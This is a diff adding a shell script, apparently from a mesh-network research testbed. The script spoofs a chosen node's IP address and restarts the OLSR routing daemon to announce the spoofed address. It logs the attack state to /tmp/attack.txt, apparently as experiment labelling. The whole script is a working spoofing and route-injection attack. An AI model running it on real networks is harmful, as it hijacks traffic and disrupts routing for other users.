@@ -1,0 +1,43 @@
+#!/bin/sh
+startTime=$1
+pendingDuration=$2
+nodeToSpoof=$3
+ipToSpoof="10.0.0.$nodeToSpoof"
+
+echo "none" > /tmp/attack.txt
+sleep $startTime
+
+if [ $pendingDuration -gt 0 ]
+then
+	echo "spoof_"$ipToSpoof > /tmp/attack.txt
+
+	ifconfig eth0:1 $ipToSpoof netmask 255.255.255.255 up
+
+	#check if its olsrd running:
+	if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
+	then
+		echo "HNA $ipToSpoof 32" > tmp.txt
+		killall nrlolsrd
+#		sleep 1
+		ifconfig eth0:1 $ipToSpoof netmask 255.255.255.255 up
+		nrlolsrd -i eth0 -hna tmp.txt &
+#		changed to allow the attack for duration regardless of start time
+#		sleep $pendingDuration
+                sleep $pendingDuration
+		killall nrlolsrd
+		rm tmp.txt
+		ifconfig "eth0:1" down
+		nrlolsrd -i eth0 &
+	else
+#		changed to allow the attack for duration regardless of start time
+#		sleep $pendingDuration
+                sleep $pendingDuration
+		ifconfig "eth0:1" down
+	fi
+fi
+
+echo "none" > /tmp/attack.txt
+
+
+
+
